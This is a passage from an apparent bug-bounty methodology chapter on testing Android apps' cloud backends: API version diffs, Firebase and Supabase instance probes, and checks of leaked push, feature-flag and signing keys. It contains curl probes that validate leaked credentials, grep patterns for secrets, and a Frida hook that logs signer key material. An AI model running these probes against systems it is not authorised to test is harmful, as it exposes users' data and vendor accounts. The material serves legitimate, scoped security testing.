curl -s -H 'Accept: application/vnd.company.v1+json'   "https://api.target.example/users" -o /dev/null -w '%{http_code}\n'
```
  Then diff four security-relevant behaviours between the old and current path for the **same operation**: auth strength (does v1 accept no token, an expired token, or a lower-privilege token that v2 rejects?), rate limiting (burst both; a missing 429 on v1 means throttling was never backported), input validation (same oversized/injection payload to both), and field exposure (does v1 return internal ids or PII the current version redacted?).
- **Proof:** A security regression on the old path, demonstrated with the same request against both versions side by side, with the body diff. Anything but `404`/connection-refused means the version is live, but a static "this version is deprecated" 200 is not a finding.
- **Escalation:** -> D15 for everything the old path exposes. Treat **every** APK-sourced endpoint as a version-diff candidate against the live web API — that is the structural move, not a one-off.
- **Ruled out when:** Every neighbouring version and version-header form returns 404 or connection-refused, or the live old path enforces identical auth, throttling, validation and field redaction to the current one across the four-way diff. Show the four comparisons.

### D18-069 · The layer-ordering trap when probing BaaS and serverless endpoints

| | |
|---|---|
| **Severity ceiling** | Support (it prevents a false Critical) |
| **VRT** | n/a — validation discipline |
| **Attacker** | n/a |
| **Applies to** | Every unauthenticated probe in this chapter against a callable function, a BaaS REST route or an app API endpoint |
| **Requires** | — |
| **Maps to** | The false-positive discipline in the bug-hunting corpus |

- **Test:** A `400 "field X is required"` returned to an unauthenticated request does **not** prove you passed authentication. Many stacks run a body parser, schema validator or sanitiser **in front of** the auth middleware, so a validation error is emitted before auth ever executes. Firebase callables in particular reject a body without a `data` envelope before checking the caller's token.
- **How:** Re-test with a minimal well-formed body before claiming any auth bypass:
```bash
FN=https://us-central1-<project>.cloudfunctions.net/<fn>
curl -s -i -X POST "$FN" -H 'Content-Type: application/json' -d '{}'            | head -5  # may hit the parser
curl -s -i -X POST "$FN" -H 'Content-Type: application/json' -d '{"data":{}}'   | head -5  # the real probe
curl -s -i -X POST "$FN" -H 'Content-Type: application/json' -d '{"data":{"id":"x"}}' -H 'Authorization: Bearer invalid.token.value' | head -5
```
  Compare all three. Only a well-formed request that is *processed* and returns a `result` is evidence that auth was absent.
- **Proof:** The three responses side by side in the report, with the well-formed unauthenticated request returning application data.
- **Escalation:** None — this item exists to stop a retraction. Apply it before filing D18-027, D18-044, D18-045 or D18-048.
- **Ruled out when:** Not applicable; this is a gate. It is "passed" when every claimed unauthenticated-access finding in the report includes the minimal well-formed request and its response.

### D18-070 · Sweep hygiene: count your results, and never claim a negative from an uncounted loop

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — validation discipline |
| **Attacker** | n/a |
| **Applies to** | Every enumeration in this chapter: bucket permutations, RTDB path sweeps, key restriction checks, token id sweeps |
| **Requires** | — |
| **Maps to** | The corpus's Shell-Loop Ban; Marker Discipline; the Statistical-Sample Rule |

- **Test:** The loop ban is chapter-independent (D01-080 states it once; D25 repeats it for its own sweeps) — this item is the D18-specific gate: counts reconcile against `wc -l` of the input file named in the item, the marker is absent from the *baseline read* before any write claim, and every "unrestricted key" claim carries the body diff of D18-011's two calls (D18-071). Shell array expansion fails **silently**. A loop over an array that the previous command did not populate produces zero iterations, no error, and output that looks complete. The corpus records an engagement that lost roughly fifty probes' worth of testing to exactly this. Every negative in this chapter's ruled-out register depends on the sweep having actually run.
- **How:** Loops of five or fewer hard-coded items in shell are fine. Anything iterating a list, a file or a computed range goes to Python with `try/except` per iteration, explicit per-iteration logging, and a final count compared against the input count:
```bash
wc -l buckets.txt rtdb_paths.txt words.txt        # input counts, recorded before the sweep
python3 sweep.py | tee sweep.log
grep -c '^' sweep.log                             # output count
tail -1 sweep.log                                 # the script's own "probed=N hits=M" line
```
  **Marker discipline** for every write probe in this chapter: 8+ random alphanumerics, no English word, no protocol keyword — never `test`, `poc`, `pwn`, `evil`, `payload`, `attacker`, and never your own domain. Before claiming a write landed, confirm the marker is absent from the baseline read.
- **Proof:** Input count, output count and the script's own tally agreeing, recorded alongside the result.
- **Escalation:** None — it is what makes the ruled-out register defensible.
- **Ruled out when:** Not applicable; this is a gate. Every "ruled out when" field in this chapter that names a sweep is only satisfied when its counts reconcile.

### D18-071 · Body-diff and restriction claims: a status code is not a result

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — validation discipline |
| **Attacker** | n/a |
| **Applies to** | Every restriction check (D18-009 to D18-012), every write probe, every bypass claim |
| **Requires** | — |
| **Maps to** | The corpus's Body-Diff Rule ("status-code-only claims are the most common rejected-as-N/A category on bug-bounty platforms") and Server-Policy-vs-State |

- **Test:** A bypass or an "unrestricted key" claim requires a response **body** differential, not a status code. A 200 with a byte-identical body is not a bypass. Equally, a server-side policy that always denies is not a state oracle — establish whether the differentiator tracks *your input* or a fixed deny-list.
- **How:**
```bash
diff <(curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K") \
     <(curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K" \
         -H "X-Android-Package: $PKG" -H "X-Android-Cert: $CERT")
# size + hash comparison for large bodies
for h in "" "-H X-Android-Package:$PKG"; do curl -s $h "$URL" | wc -c; curl -s $h "$URL" | sha256sum; done
```
  Then identify what changed: a correlation id, a timestamp, or real content. A five-byte difference might be meaningful; identify it rather than asserting it.
- **Proof:** The byte-level diff in the report. For every "the key is unrestricted" claim, include the body, not only `"status": "OK"`.
- **Escalation:** None — it is what keeps D18-009 through D18-012 defensible under triage.
- **Ruled out when:** Not applicable; this is a gate.

### D18-072 · Evidence hygiene, severity governance and filing order for cloud findings

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — reporting discipline |
| **Attacker** | n/a |
| **Applies to** | Every finding in this chapter |
| **Requires** | — |
| **Maps to** | The corpus's evidence-hygiene, pre-severity-gate, retraction and chain-filing guidance; HackerOne's leaked-credential standard; Intigriti's triage standards on out-of-scope testing |

- **Test:** Cloud findings distribute other people's data by construction, so the evidence rules are stricter here than anywhere else in the engagement, and the severity claim is the thing the gate runs against.
- **How:**
  * **PII split.** Mask: other users' first/last names, email local parts, phone digits, addresses below city level, dates of birth, government ids, face images, correlatable account ids. **Leave visible:** the JSON key names, the field shape (`"first_name": "<REDACTED>"`), **your own attacker uid/email** (this is what proves the boundary crossing), the endpoint URL and method, the trace id. Then state it in the report body: *"Real PII fields in the response are masked to limit unauthorised exposure of victim data, per responsible-disclosure hygiene. The unredacted response is available privately on request."*
  * **HAR/credential sanitising** before attaching anything:
```bash
jq '.log.entries |= map(
  (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-api-key","apikey") then .value="<REDACTED>" else . end)) |
  (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
  (.request.cookies  |= map(.value="<REDACTED>")) |
  (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
grep -i 'authorization\|"cookie"\|apikey' out.sanitized.har | head -20   # verify the redaction worked
```
  * **State-change findings** (D18-015, D18-018, D18-022, D18-040, D18-048, D18-064) get the five-screenshot pattern: pre-state, the bug, negative post-state, positive post-state, side effect — all taken in one sitting without reloading between captures, filenames `{finding}-step{n}-{description}.png`, referenced by filename in the body.
  * **Pre-severity gate, run against the Critical *claim*, not the bug:** have you validated the full chain to attacker-attainable impact, or only one primitive? What does the attacker walk away with, in one concrete sentence? Have you reproduced it end to end at least twice? Is an inheritance, signature, audience or App Check gate still in the way? Has the program rejected this severity class before? Never write "could potentially" — either demonstrate the impact or downgrade the claim to what you showed.
  * **Chain-filing order:** file the primitives first so their ids exist (the leaked credential, the open rule, the missing App Check), then the consumer with the full narrative at the chained severity, then backfill the cross-references. One fix equals one bounty; a chain is a severity amplifier, not a merge request.
  * **Retraction discipline:** if a claim fails reproduction, document it in a retraction appendix with the original signal, the disproving evidence and why it looked like a bug. The inverse also holds — do **not** retract a confirmed finding that stopped reproducing because the client patched mid-engagement; keep the timestamped pre-patch evidence and say so.
  * **The ethical boundary for credentials:** verify they authenticate, then stop. Authenticate and immediately deauthenticate; do not exercise functionality, do not enumerate, do not touch production data. Active testing on assets not explicitly in scope earns no bounty and can invite sanctions.
- **Proof:** A clean artefact set, a sanitised HAR, and a report whose impact sentence names a real number.
- **Escalation:** None — it is what converts correct findings into paid ones.
- **Ruled out when:** Not applicable; this is a gate applied to every submission.

### D18-073 · Compiled-in environment table: non-production endpoints shipped in the release build, and the selector that picks them

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the table; `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) when a non-prod host is reachable; rate at the redirected credential when AM-02/AM-03 can flip the selector |
| **Attacker** | AM-01 for the table; AM-02 / AM-03 / AM-11 for the selector |
| **Applies to** | Apps whose release build carries more than one backend environment (prod / staging / dev / loopback) |
| **Requires** | backend-api |
| **Maps to** | MASWE-0004; API8:2023; the D18-055 / D18-068 staging-host class |
| **Record** | logs/D18-073.txt; requests/E-NNN.http for the redirected request |

- **Test:** A release build that still holds a staging, dev or `http://localhost:<port>` entry in an environment enum, plus a selector (debug menu, preference, remote flag, deep-link parameter, restored backup value) that chooses among them. The table is a P3 leak of internal hosts; the selector decides whether an attacker can point an authenticated client at a weaker or cleartext backend. D18-055 compares keys across builds and D18-068 diffs API versions — neither asks whether the environment can be flipped.
- **How:**
```bash
grep -rnE 'https?://[a-z0-9.-]+(:[0-9]+)?/' "$S" | grep -iE 'staging|stg|dev|qa|uat|sandbox|preprod|internal|localhost|127\.0\.0\.1|10\.0\.2\.2' | sort -u
grep -rnE 'http://(localhost|127\.0\.0\.1|10\.0\.2\.2)(:[0-9]+)?' "$S" "$R" | sort -u
# the selector: who reads the environment choice, and can it be set from outside the app?
grep -rnE '(getString|getInt|getBoolean)\("?(env|environment|backend|server|base_url|endpoint)' "$S" | head
grep -rnE 'getQueryParameter\("?(env|environment|server|host|base_url)' "$S"
grep -rnE 'BuildConfig\.(FLAVOR|BUILD_TYPE|DEBUG)' "$S" | grep -iE 'url|env|host' | head
```
  Then set the selector by every external route the code admits (deep link -> D09, restored backup -> D11, remote flag -> D18-025) and watch in the proxy which host the next authenticated request reaches.
- **Proof:** The environment table with `file:line`; for the selector, an authenticated request (bearer present, value masked) arriving at the non-production host after a change made from an attacker position — not from a debug menu you opened yourself.
- **Escalation:** A reachable non-prod host -> D18-068 and -> D15; a cleartext entry the selector can reach -> D14; a selector reachable by deep link or backup -> D09 / D11 chain, rated at the credential it redirects.
- **Ruled out when:** Only the production entry exists in the release build, or non-prod entries exist but every selector is compiled out (`BuildConfig.DEBUG`-guarded with `DEBUG=false` in the shipped `BuildConfig`), unreachable from any exported surface and not server-settable. Quote the guard.

### D18-074 · Push/engagement vendor REST key shipped where the app id belongs (OneSignal, Braze, Airship, Pushwoosh, MoEngage, CleverTap)

| | |
|---|---|
| **Severity ceiling** | High (Critical where the handler of D18-034 routes on payload) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Apps bundling a third-party push or engagement SDK |
| **Requires** | push |
| **Maps to** | CWE-798; MASWE-0004; the H1 #789370 FCM-server-key class (D18-031), re-hosted at the vendor now that the legacy FCM endpoint is gone |
| **Record** | logs/D18-074.txt |

- **Test:** Each vendor ships an **app id** (client, public) and a **REST/API key** (server: sends to the whole install base, exports the audience). The REST key in the APK is the current form of the FCM-server-key finding; the vendor's *read* endpoint is the non-mutating validator. D18-046's generic read-key test does not name these endpoints or the audience-export impact.
- **How:**
```bash
grep -rnoiE 'onesignal_app_id|os_v2_app_[a-z0-9_]{40,}|OneSignal\.(initWithContext|setAppId)|com_braze_api_key|braze_api_key|airship|UA_[A-Za-z0-9_-]{20,}|pushwoosh|moe_app_id|clevertap_account_(id|token)|rest_api_key|api_key_(prod|production)' "$S" "$R/values" "$A" | sort -u
# validate with a READ endpoint only — never a send, never a segment create
curl -s "https://api.onesignal.com/apps/<app_id>" -H "Authorization: Key <candidate>" | jq '{name, players, messageable_players, updated_at, error: .errors}'   # 200 with counts = REST key; 403 = app id / client key
curl -s "https://rest.<cluster>.braze.com/segments/list" -H "Authorization: Bearer <candidate>" | head -c 300
curl -s "https://go.urbanairship.com/api/segments" -u "<app_key>:<candidate>" -H 'Accept: application/vnd.urbanairship+json; version=3' | head -c 300
```
- **Proof:** A 200 from the vendor's management endpoint with the key from the package, showing the audience size. State — do not demonstrate — that the same key sends to every subscribed device under the vendor's brand.
- **Escalation:** -> D18-034 (a handler that routes on message content makes this remote navigation control: Critical); -> D20 for the audience export (device ids, emails, tags, locations).
- **Ruled out when:** Only the app id / client key is present and the vendor's read endpoint rejects every candidate (paste the 401/403 body). The vendor's documentation naming the key as client-safe is the P5 graveyard reference.

### D18-075 · Second data-plane instances: named Firestore databases, extra RTDB instances, secondary Storage buckets, BaaS storage and functions

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) |
| **Attacker** | AM-01 |
| **Applies to** | Firebase and Supabase/PostgREST projects |
| **Requires** | firebase |
| **Maps to** | MASTG-KNOW-0039; Firebase insecure-rules documentation (rules are per database and per bucket) |
| **Record** | logs/D18-075.txt; the three instance lists |

- **Test:** Rules are per instance. A project may hold several Firestore databases (`FirebaseFirestore.getInstance(app, "<name>")`, GA since 2023), several RTDB instances and several Storage buckets; teams lock `(default)` and leave the others. Supabase adds Storage buckets and Edge Functions beside PostgREST. D18-014 to D18-022 and D18-044 probe only the default instance — probe every instance the package names.
- **How:**
```bash
grep -rnoE 'getInstance\([^)]*"[A-Za-z0-9_-]+"\)' "$S" | grep -i firestore | grep -oE '"[^"]+"' | tr -d '"' | sort -u > firestore_dbs.txt
grep -rhoE 'https://[a-z0-9-]+\.(firebaseio\.com|[a-z0-9-]+\.firebasedatabase\.app)' "$DEC" | sort -u > rtdb_instances.txt
grep -rhoE 'gs://[a-z0-9._-]+|[a-z0-9-]+\.(appspot\.com|firebasestorage\.app)' "$DEC" | sort -u > buckets_fb.txt
wc -l firestore_dbs.txt rtdb_instances.txt buckets_fb.txt
curl -s -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/<name>/documents:listCollectionIds?key=$K" -H 'Content-Type: application/json' -d '{}' | jq -c '.collectionIds // .error.status'
# Supabase: storage buckets and edge functions beside PostgREST
curl -s -X POST "https://$REF.supabase.co/storage/v1/object/list/<bucket>" -H "apikey: $ANON" -H "Authorization: Bearer $ANON" -H 'Content-Type: application/json' -d '{"prefix":"","limit":20}' | head -c 600
grep -rnoE 'functions/v1/[A-Za-z0-9_-]+|storage/v1/object/(public/)?[A-Za-z0-9_-]+' "$S" | sort -u
```
  Then run D18-014/-015/-017/-018/-021/-022 once per instance, counting per D18-070.
- **Proof:** Data from a non-default instance beside the `PERMISSION_DENIED` of the default, in one evidence block, with the instance name as it appears in the dex.
- **Escalation:** As D18-014 to D18-022 for the instance; a `backup` / `export` instance is usually the whole production dataset.
- **Ruled out when:** Every instance in the three lists (counts stated) returns the rules denial unauthenticated and with a self-enrolled identity (D18-020).

### D18-076 · Feature-flag and experimentation vendor keys evaluated client-side

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the flag set; rate up to the control a flag disables (D18-025) |
| **Attacker** | AM-01 |
| **Applies to** | Apps with a hosted feature-flag SDK (LaunchDarkly, Statsig, Optimizely, GrowthBook, Split, Flagsmith) |
| **Requires** | backend-api |
| **Maps to** | API8:2023; MASWE-0004; the D18-023 / D18-025 Remote Config class at another vendor |
| **Record** | logs/D18-076.txt |

- **Test:** Client-side flag SDKs ship a key that returns the **entire** flag/experiment set with targeting rules to any caller. The set names unreleased features, internal hosts, employee cohorts (emails in a rule) and security toggles. D18-024 names these vendors in Applies-to but the chapter's probes are Firebase-only.
- **How:**
```bash
grep -rnoE 'mob-[0-9a-f-]{36}|sdk-[0-9a-f-]{36}|client-[A-Za-z0-9]{20,}|secret-[A-Za-z0-9]{20,}|launchdarkly|statsig|optimizely|growthbook|split\.io|flagsmith' "$S" "$R/values" | sort -u
CTX=$(printf '{"kind":"user","key":"zq7x4kd2"}' | base64 | tr '+/' '-_' | tr -d '=')
curl -s "https://clientsdk.launchdarkly.com/msdk/evalx/contexts/$CTX" -H 'Authorization: mob-…' | jq 'keys | length'                                   # LaunchDarkly mobile key: whole flag set for any context
curl -s -X POST https://featuregates.org/v1/initialize -H 'statsig-api-key: client-…' -H 'Content-Type: application/json' -d '{"user":{"userID":"zq7x4kd2"},"statsigMetadata":{"sdkType":"android"}}' | jq '{gates: (.feature_gates|length), configs: (.dynamic_configs|length)}'
curl -s "https://cdn.optimizely.com/datafiles/<sdk_key>.json" | jq '{experiments: (.experiments|length), audiences: [.audiences[]?.conditions]}'
```
- **Proof:** The flag/experiment inventory with any internal hostname, security toggle or PII-bearing targeting rule highlighted; one flag that D18-025 then shows the client obeys.
- **Escalation:** -> D18-025; a *server-side* key in the APK (LaunchDarkly `sdk-…` / `api-…`, Statsig `secret-…`) reads and writes flags for every user — a P1 primitive, file it on its own.
- **Ruled out when:** Only a client/mobile key is present, the returned set holds no internal host, no PII in rules and no security-relevant toggle, and the server-key regex is empty. Record the flag count.

### D18-077 · Client-side signing of storage and upload URLs: the signer is in the package

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1) for an AWS/GCP signer; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a vendor signing secret |
| **Attacker** | AM-01 |
| **Applies to** | Apps that upload to or fetch from object storage or a media CDN directly |
| **Requires** | — |
| **Maps to** | CWE-798; MASWE-0004; D18-035, D18-043, D18-049 |
| **Record** | logs/D18-077.txt |

- **Test:** A correct backend mints the signed URL server-side and hands the client only the URL. If the app builds the signature itself it holds the signer: an AWS secret, a GCS service-account key, a CDN key pair or a vendor API secret — with no vendor prefix for D18-035/-049 to grep. Holding it means minting URLs for any object key: the D18-043 IDOR without the listing.
- **How:**
```bash
grep -rnE 'presign|Presigned|AWS4-HMAC-SHA256|X-Amz-Signature|X-Goog-Signature|GoogleAccessId|CloudFront-Signature|Key-Pair-Id|api_sign_request|signature=' "$S" | head -30
grep -rnE 'Mac\.getInstance\("Hmac(SHA1|SHA256)"\)|Signature\.getInstance\("SHA256withRSA"\)' "$S" | head        # a local signer near a storage host is the signal
```
```javascript
Java.perform(function () {   // what key material initialises the signer, and who calls it?
  var Log = Java.use('android.util.Log'), Ex = Java.use('java.lang.Exception');
  var Mac = Java.use('javax.crypto.Mac');
  Mac.init.overload('java.security.Key').implementation = function (k) {
    var enc = k.getEncoded();
    console.log('[Mac.init] ' + this.getAlgorithm() + ' keylen=' + (enc ? enc.length : '?') + '\n  ' + Log.getStackTraceString(Ex.$new()).split('\n').slice(1,5).join(' | '));
    return this.init(k); };
});
```
  In the proxy: does every signed URL arrive in a *response* from the first-party backend (server-minted) or appear only in a *request* the app issued with no prior mint call (client-signed)?
- **Proof:** The signing secret with `file:line` (or the hook showing it loaded from package-resident material), one signed URL minted off-device with it, and the storage host honouring it (`200` on an object path you own). Stop at one object.
- **Escalation:** An AWS signer is a long-lived IAM credential -> D18-035 scope check; sign a URL for another user's key path -> D18-043; a media vendor -> D18-049.
- **Ruled out when:** Every signed URL in the proxy is received from the first-party backend and no signer in the app is initialised with package-resident key material (the hook log shows only TLS/keystore-backed keys). Show the mint call.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "Hardcoded Google API key found in `strings.xml`" | The APK is public by construction (AOSP security model rule ①: all static code and data in an APK is public). Firebase Web API keys are documented as embeddable; Reddit explicitly excludes them; Bugcrowd rates `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` P5. | Show the key authenticating from a host that is not the app and returning data or performing a billable/mutating operation — then it is `…for_publicly_accessible_asset` (P1) or `…pay_per_use_abuse` (P4). |
| Maps key returning `REQUEST_DENIED` with "Requests from this Android client are blocked" | The key is package + SHA-1 restricted. The corpus is explicit that this is a ruled-out entry, not a Low. | Nothing, for that key. Move to D18-012 and find one that is not restricted, or show an IP-unrestricted key reaching a data API. |
| `gcm_defaultSenderId` / `google_app_id` in the package | Client identifiers, required by the SDK. H1 #941590 rated a sender key **Low**; the server key in H1 #789370 was **Critical**. | A service-account JSON (D18-032) or a push-vendor REST key (D18-074), validated with a read-only call — the legacy `AAAA…:APA91b…` server key sends nothing since the 2024-07-22 shutdown (D18-031). |
| Firestore/RTDB returning `{"error":"Permission denied"}` at the root | Rules are in force at that node. | A permissive child path (rules cascade downwards only — D18-016), an authenticated read with a self-minted identity (D18-019/-020), or a callable function that reads with admin credentials (D18-027). |
| A public assets bucket that lists CSS, fonts and marketing images | Public by design; it is a CDN. | Object keys that identify users or documents (D18-043), anonymous **write** (D18-040), or a bucket the app loads code/config from. |
| Stripe `pk_live_` publishable key, Braintree client token, analytics ingest write key | Documented public client credentials; the vendor's own model expects them in the client. | The same vendor's **secret**/management key (D18-047), or the ingest key accepted by the vendor's export/read API (D18-046). |
| GraphQL introspection enabled on an AppSync endpoint | On the never-submit list on its own. | A query executed with the packaged key that returns records it should not — then it is the data finding, not the introspection. |
| Wildcard `Access-Control-Allow-Origin` on a `*.appspot.com` host | A wildcard ACAO without a credential-exfil PoC is on the never-submit list, and a wildcard cannot be combined with credentials by browsers anyway. | A **reflected** origin plus `Access-Control-Allow-Credentials: true` on a path returning authenticated data, with a working cross-origin read (D18-030). |
| "This SDK is outdated (version X)" | `using_components_with_known_vulnerabilities.outdated_software_version` is P5, and most of the named ASI library CVEs (Libpng, Libjpeg-turbo, OpenSSL logjam/CVE-2015-3194/CVE-2014-0224, Libupup CVE-2015-8540, Apache Cordova CVE-2015-5256/CVE-2015-1835/CVE-2014-3500/-3501/-3502, GnuTLS) are **LEGACY**. | A matched version string **plus** a demonstration that the vulnerable code path is reachable from app input (D18-067, -> D17). |
| An SDK-declared component is exported | Exported and inert is not a finding — it is one of the corpus's named non-paying classes. | The three-artefact ownership proof of D18-067: it ships here, a zero-permission app reaches it, and the impact lands on *this* app's data. |
| Remote Config contains feature flags | Flags are what Remote Config is for. | A credential in a value (D18-024), an internal/staging hostname that resolves (D18-023), or a value the client obeys for a security decision (D18-025). |
| MobSF/AndroBugs flagged "Firebase database found" | Unverified scanner output is, per the corpus, the single fastest route to N/A and a damaged platform reputation. | The `.json` probe result — either the data (finding) or the permission-denied body (ruled-out entry). |
| An AWS key that returns `InvalidClientTokenId` | Dead credential. | A live one, proved with `sts get-caller-identity` and its attached policy names — and nothing further. |
| App Check not implemented | Medium at best standalone; it is a defence-in-depth control, and on its own it is not attacker-attainable harm. | Pair it with a rules or callable finding and write it as the missing-mitigation line that makes that finding remotely reachable rather than on-device only (D18-029). |
| Session-replay SDK present in the package | Presence is inventory. | A canary typed into a sensitive field found in the decompressed upload payload, or visible in the vendor's replay (D18-059). |
| Analytics SDK sends an advertising id | Pseudonymous identifier, the SDK's stated purpose, and most vendors run privacy at a much lower band anyway. | The identifier **joined to an account id**, an email, a phone number, precise location, or a session token — and transmitted before consent (D18-057, D18-058). |

## Cross-surface joins

- **Merged manifest (D18-006/-066) × WebView configuration (D10).** Nobody reviews a third-party SDK's WebView. The Grab case (H1 #401793) is exactly this join: a *support SDK's* activity, reachable by deep link, hosting a WebView with `addJavascriptInterface` exposing `getGrabUser()`. The app team audited their own WebViews and the vendor audited theirs in isolation; the bridge lived in the seam. Enumerate every WebView **outside** the first-party package prefix and rate it by what its bridge methods return.
- **Writable object storage (D18-040/-022) × dynamic code and content loading (D17/D02).** The storage test and the code-loading test are usually run by different people on different days. Join them: take the bucket you can write to and ask whether any path in it is a JS bundle, a config JSON, an OTA payload or an image the app renders in a WebView. A writable asset bucket that the app loads code from is remote code execution for every install, and is rated there — not as a storage misconfiguration.
- **Remote Config (D18-023/-025) × certificate pinning (D14) × the shadow API (D18-068).** Pinning is P5 on its own and config is "just flags" on its own. Joined: a config value named `enforce_pinning` or `api_base_url` that the client obeys, fetched over a channel that is itself unpinned, means an AM-06 network attacker redirects authenticated traffic to a host of their choosing — and the staging host the config leaks is usually the weaker API version. Three P5-to-P4 observations compose into a remote finding.
- **Firebase Auth self-enrolment (D18-020) × the app's own API (D15).** The project identity you minted for the rules test is frequently the *same* identity the app's backend trusts. Take the `idToken` from `accounts:signUp` and present it to the first-party API. Where the backend verifies the Firebase token but derives authorisation from a claim the client controls, an anonymous identity becomes an authenticated one on the real API.
- **Push send credential (D18-031/-032) × the message handler (D18-034) × deep links (D09).** A server key is High as mass phishing. Joined with a handler that routes on message content and a deep link that reaches a sensitive route, the same credential is remote, zero-interaction navigation control over every install — the D09 chain without needing the victim to click anything.
- **Crash reporter configuration (D18-060) × logcat findings (D20) × the OkHttp interceptor (D14).** Each is capped: logcat needs a local reader, `HttpLoggingInterceptor` is a code smell, the crash SDK is inventory. Joined, the interceptor writes the bearer token to logcat, the reporter attaches logcat to crash reports, and the token leaves the device to a third party — which removes the on-device reachability cap that limited the logcat finding.
- **Cognito/identity-pool role scope (D18-036/-037) × object-key structure (D18-043) × the app's own IDOR surface (D15).** The role decides *whether* you can call S3; the key structure decides *whose* object you get. Testers usually stop at the role. Enumerate the per-identity prefix convention from the listing and then test the same substitution against the app's own download endpoint — the two surfaces frequently disagree about who owns an object.
- **App Startup initialisers (D18-065) × backup and restore (D11).** An initialiser that reads a config or token from `SharedPreferences` before any gate, combined with permissive backup rules, means an attacker-supplied restore seeds the app's control plane before the lock screen is drawn. Neither surface is interesting alone.
- **SDK-injected permissions (D18-066) × confused-deputy components (D05).** The permission an SDK merged in is exactly what an exported first-party receiver inherits. Cross the merged-manifest permission list against the exported-component list: an SDK-contributed `READ_PHONE_STATE` or location permission raises the ceiling of every confused-deputy primitive the app already had.

## Sources

- **OWASP MASTG/MASVS/MASWE** — MASTG-TEST-0318 and MASTG-TEST-0319 (static and runtime SDK data handling, with the Firebase Analytics worked example), MASTG-TEST-0206, MASTG-KNOW-0039 (Firebase Real-time Databases), MASTG-KNOW-0026, MASTG-TECH-0007/-0019/-0033/-0043/-0100, MASTG-TOOL-0125 (Apkleaks), MASTG-TOOL-0144 (gitleaks), MASTG-TOOL-0134 (cdxgen), MASTG-TOOL-0131 (dependency-check); MASWE-0004, MASWE-0044, MASWE-0069, MASWE-0073, MASWE-0078; MASVS-STORAGE-1, MASVS-PRIVACY-1/-3/-4. The corpus notes there is **no dedicated Android MASTG-TEST for cloud-backend misconfiguration** — a documented MASTG gap that this chapter fills.
- **Bugcrowd VRT (release 2026-07-08, 581 entries)** — every VRT path in this chapter was taken from the full tree, including the `cloud_security` branch (`…publicly_accessible_iam_credentials` P1, `…overly_permissive_iam_roles` P2, `…publicly_accessible_cloud_storage` VARIES, `…unencrypted_sensitive_data_at_rest` P2, `…insecure_api_endpoints` P4) and the `sensitive_data_exposure.disclosure_of_secrets` branch (`…for_publicly_accessible_asset` P1, `…for_internal_asset` P3, `…pay_per_use_abuse` P4, `…pii_leakage_exposure` VARIES, `…intentionally_public_sample_or_invalid` P5).
- **Disclosed HackerOne reports** — #1065134 (Zego, Firebase database takeover, High 7.5), #684099 (Periscope, Critical), #1447751 / #1351326 / #1351329 / #1691888 (MTN), #731724 (MobiSystems, Firestore REST), #789370 (Smule, FCM server key, Critical), #941590 (Hostinger, GCM sender key, Low), #351555 (Reverb, Cloudinary), #412772 (8x8, High, $500), #753868 (Zenly, $750), #440629 (Starbucks), #1641475 (GlassWire), #792850 (NordVPN), #488371 (Mail.ru), #401793 (Grab, support-SDK WebView bridge, High 7.1), #180349 (Zendesk Android SDK broadcast), #532836 / #1455987 (Exness, SurveyMonkey SDK), #258460 (Quora, gotev UploadService), #192886 (Mapbox SDK), #694053 (Lark), #41856 (Crashlytics/fabric.io), #1021906, #361438, #231460, #753602, #716292, #352869.
- **Vendor documentation** — Firebase insecure-rules documentation (the `".read": true` / `request.auth != null` cases, cascading rules, open Storage rules); Firebase Remote Config parameters and conditions ("Don't store confidential data in Remote Config parameter keys or values"); `firebase.google.com/docs/app-check` (Play Integrity provider, the protected services list, debug providers as local-development-only); Google Cloud API key documentation (`X-Android-Package` / `X-Android-Cert` restriction enforcement); `developers.google.com/maps/api-security-best-practices` (package + SHA-1 restriction, API restrictions, customer financial liability, Secrets Gradle Plugin); Amazon Cognito identity pools (guest access and per-identity-type IAM roles); `developers.intercom.com/installing-intercom/android/identity-verification` (`setUserHash`, HMAC-SHA256, server-side secret, 401 on failure); `developer.android.com` risk pages for insecure library, insecure API usage, hardcoded cryptographic secrets, android-exported, access control to exported components, log info disclosure; App Startup, manifest merge / `AD_ID` auto-merge, foreground-service types, Photo Picker backport.
- **Google App Security Improvement campaigns** — "Exposed Firebase Cloud Messaging Server Keys" (started 2021-10-12, `support.google.com/faqs/topic/11015404`), including the remediation warning that removing a key from the current build does not fix it; the ad-SDK campaigns (Supersonic, Vpon, Airpush, MoPub, AdMarvel, Vungle, Vitamio) and the library campaigns (Libpng, Libjpeg-turbo, OpenSSL, Libupup, Apache Cordova, GnuTLS) with their named CVEs.
- **AOSP security-model paper** — §3 rule ① (all static code and data in an APK is public), §4.3.4 (embedded libraries are inside the app's security boundary; the Android 13 SDK Runtime exception for ads SDKs and its lack of inter-SDK isolation).
- **MITRE ATT&CK Mobile** — T1481.002 Bidirectional Communication (Firebase named as a C2 channel for Mandrake, TERRACOTTA, VajraSpy S9006), T1437.001 Web Protocols, T1474.001, T1533, T1532, T1646, T1430 / T1430.001.
